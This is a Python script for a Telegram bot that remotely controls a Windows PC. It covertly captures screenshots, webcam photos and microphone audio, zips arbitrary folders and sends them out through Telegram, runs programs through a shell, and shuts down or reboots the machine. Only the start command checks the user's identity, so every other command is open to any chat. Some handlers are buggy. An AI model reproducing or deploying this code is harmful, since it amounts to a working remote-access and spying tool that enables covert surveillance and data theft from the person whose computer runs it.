import telebot
import pyautogui
import subprocess
import os
import socket
import platform
import psutil
import cv2
from PIL import Image
import config
import sounddevice as sd
import numpy as np
import wavio
import threading
from functools import partial
import psutil
import webbrowser
import zipfile
import shutil




# Замените 'YOUR_BOT_TOKEN' на токен вашего Telegram бота
bot = telebot.TeleBot('YOUR_BOT_TOKEN')

# Переменная для отслеживания ожидания фото/видео
waiting_for_media = False

# Переменная для отслеживания записи аудио
recording_audio = False

# Функция для записи аудио
def record_audio(message):  # Принимает параметр message
    global recording_audio
    recording_audio = True
    bot.send_message(message.chat.id, "Начинаю запись аудио...")
    audio_duration = 10  # Длительность записи аудио в секундах
    sample_rate = 44100  # Частота дискретизации
    channels = 2  # Количество аудио каналов (стерео)
    filename = 'recorded_audio.wav'
    
    # Запуск записи аудио
    audio_data = sd.rec(int(audio_duration * sample_rate), samplerate=sample_rate, channels=channels)
    sd.wait()
    
    # Сохранение записанного аудио с использованием wavio
    wavio.write(filename, audio_data, sample_rate, sampwidth=3)
    
    # Отправка записанного аудио в чат
    with open(filename, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)
    
    bot.send_message(message.chat.id, "Запись аудио завершена.")
    recording_audio = False
    os.remove(filename)

# В функции start_audio_recording() используйте functools.partial для передачи message
@bot.message_handler(func=lambda message: message.text == "Запись аудио")
def start_audio_recording(message):
    global recording_audio
    if not recording_audio:
        # Запускаем запись аудио в отдельном потоке с помощью functools.partial
        audio_thread = threading.Thread(target=partial(record_audio, message))
        audio_thread.start()
    else:
        bot.send_message(message.chat.id, "Запись аудио уже идет.")

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == config.allowed_user_id:
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        screenshot_button = telebot.types.KeyboardButton("Скриншот")
        shutdown_button = telebot.types.KeyboardButton("Выключить")
        info_button = telebot.types.KeyboardButton("Информация")
        reboot_button = telebot.types.KeyboardButton("Перезагрузка")
        webcam_button = telebot.types.KeyboardButton("Вебка")
        media_button = telebot.types.KeyboardButton("Открыть фото/видео")
        audio_button = telebot.types.KeyboardButton("Запись аудио")
        run_program_button = telebot.types.KeyboardButton("Запустить программу") 
        open_link_button = telebot.types.KeyboardButton("Открыть ссылку")
        save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
        
        markup.row(screenshot_button, shutdown_button, info_button)
        markup.row(reboot_button, webcam_button)
        markup.row(media_button, audio_button, run_program_button)  
        open_link_button = telebot.types.KeyboardButton("Открыть ссылку")
        markup.add(open_link_button)
        save_folder_button = telebot.types.KeyboardButton("Сохранить папку")
        markup.add(save_folder_button)

        
        bot.send_message(message.chat.id, "Скрипт запущен / made by @danieldrain ")
        
        bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
    else:
        bot.send_message(message.chat.id, "Вы не авторизованы для использования этого бота.")

@bot.message_handler(func=lambda message: message.text == "Сохранить папку")
def save_folder_handler(message):
    bot.send_message(message.chat.id, "Пожалуйста, отправьте мне путь к папке, которую вы хотите сохранить в ZIP архиве.")
    bot.send_message(message.chat.id, "Функция находится в БЕТА-Тестировании. Возможны баги.")

# Обработчик текстового сообщения с путем к папке
@bot.message_handler(func=lambda message: os.path.exists(message.text) and os.path.isdir(message.text))
def create_zip_archive(message):
    folder_path = message.text
    zip_filename = 'saved_folder.zip'
    
    # Создаем ZIP архив
    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)
    
    # Отправляем ZIP архив
    with open(zip_filename, 'rb') as zip_file:
        bot.send_document(message.chat.id, zip_file)
    
    # Удаляем временный ZIP файл
    os.remove(zip_filename)
    
    bot.send_message(message.chat.id, "Папка успешно сохранена в ZIP архиве и отправлена вам!")

@bot.message_handler(func=lambda message: message.text == "Открыть ссылку")
def open_link_handler(message):
    bot.send_message(message.chat.id, "Пожалуйста, отправьте мне ссылку, которую вы хотите открыть в браузере.")

# Обработчик текстового сообщения с ссылкой
@bot.message_handler(func=lambda message: message.text.startswith("http://") or message.text.startswith("https://"))
def open_browser(message):
    url = message.text
    webbrowser.open(url)
    bot.send_message(message.chat.id, f"Ссылка {url} успешно открыта в браузере!")

# Функция для запуска программы
def run_program(message, program_path):
    try:
        subprocess.Popen(program_path, shell=True)
        bot.send_message(message.chat.id, f"Программа по пути {program_path} успешно запущена.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка при запуске программы: {str(e)}")

@bot.message_handler(func=lambda message: message.text == "Запустить программу")
def start_program(message):
    bot.send_message(message.chat.id, "Введите путь к программе для запуска:")
    bot.register_next_step_handler(message, get_program_path)

def get_program_path(message):
    program_path = message.text
    if os.path.exists(program_path):
        run_program(message, program_path)
    else:
        bot.send_message(message.chat.id, "Указанный путь к программе не существует.")

@bot.message_handler(func=lambda message: message.text == "Скриншот")
def take_screenshot(message):
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')
    with open('screenshot.png', 'rb') as photo:
        bot.send_photo(message.chat.id, photo)
    os.remove('screenshot.png')

@bot.message_handler(func=lambda message: message.text == "Выключить")
def shutdown_computer(message):
    subprocess.Popen(['shutdown', '/s', '/t', '60'])
    bot.send_message(message.chat.id, "Компьютер будет выключен через 60 секунд.")

@bot.message_handler(func=lambda message: message.text == "Перезагрузка")
def reboot_computer(message):
    subprocess.Popen(['shutdown', '/r', '/t', '10'])
    bot.send_message(message.chat.id, "Компьютер будет перезагружен через 10 секунду.")

@bot.message_handler(func=lambda message: message.text == "Информация")
def get_system_info(message):
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    os_info = platform.platform()
    
    # Получаем информацию о загрузке CPU и использовании памяти
    cpu_percent = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    
    disk_info = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint).percent
            disk_info.append(f"{part.device}: {usage}%")
        except PermissionError:
            disk_info.append(f"{part.device}: Недоступен")
    
    info_message = "Имя хоста: {}\nIP-адрес: {}\nОС: {}\n".format(hostname, ip_address, os_info)
    info_message += "Использование CPU: {}%\n".format(cpu_percent)
    info_message += "Использование памяти: {}%\n".format(memory_info.percent)
    info_message += "Диски:\n{}".format('\n'.join(disk_info))
    
    bot.send_message(message.chat.id, info_message)

@bot.message_handler(func=lambda message: message.text == "Вебка")
def capture_webcam_photo(message):
    # Ищем все доступные вебкамеры
    webcam_count = len(cv2.VideoCapture(0).read())
    if webcam_count > 0:
        # Подключаемся к первой найденной вебкамере
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            # Сохраняем фотографию
            cv2.imwrite('webcam_capture.png', frame)
            with open('webcam_capture.png', 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
            os.remove('webcam_capture.png')
        cap.release()
    else:
        bot.send_message(message.chat.id, "Вебкамера не найдена.")

@bot.message_handler(func=lambda message: message.text == "Открыть фото/видео")
def wait_for_media(message):
    global waiting_for_media
    waiting_for_media = True
    bot.send_message(message.chat.id, "Жду материал. Отправьте фото или видео.")

@bot.message_handler(func=lambda message: message.text == "Запись аудио")
def start_audio_recording(message):
    global recording_audio
    if not recording_audio:
        # Запускаем запись аудио в отдельном потоке
        audio_thread = threading.Thread(target=record_audio)
        audio_thread.start()
    else:
        bot.send_message(message.chat.id, "Запись аудио уже идет.")

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    global waiting_for_media
    if waiting_for_media:
        # Получаем фото и сохраняем его
        file_id = message.photo[-1].file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('downloaded_media.jpg', 'wb') as media_file:
            media_file.write(downloaded_file)
        
        # Открываем и показываем фото
        img = Image.open('downloaded_media.jpg')
        img.show()
        
        bot.send_message(message.chat.id, "Фото получено и открыто.")
        waiting_for_media = False
    else:
        bot.send_message(message.chat.id, "Не ожидал фото.")

@bot.message_handler(content_types=['video'])
def handle_video(message):
    global waiting_for_media
    if waiting_for_media:
        # Получаем видео и сохраняем его
        file_id = message.video.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        with open('downloaded_media.mp4', 'wb') as media_file:
            media_file.write(downloaded_file)
        
        # Открываем и показываем видео
        cap = cv2.VideoCapture('downloaded_media.mp4')
        while True:
            ret, frame = cap.read()
            if not ret:
                break
            cv2.imshow('Video', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break
        cap.release()
        cv2.destroyAllWindows()
        
        bot.send_message(message.chat.id, "Видео получено и открыто.")
        waiting_for_media = False
    else:
        bot.send_message(message.chat.id, "Не ожидал фото или видео.")



@bot.message_handler(func=lambda message: True)
def handle_other_messages(message):
    bot.reply_to(message, "Используйте кнопки на клавиатуре для управления.")

bot.polling()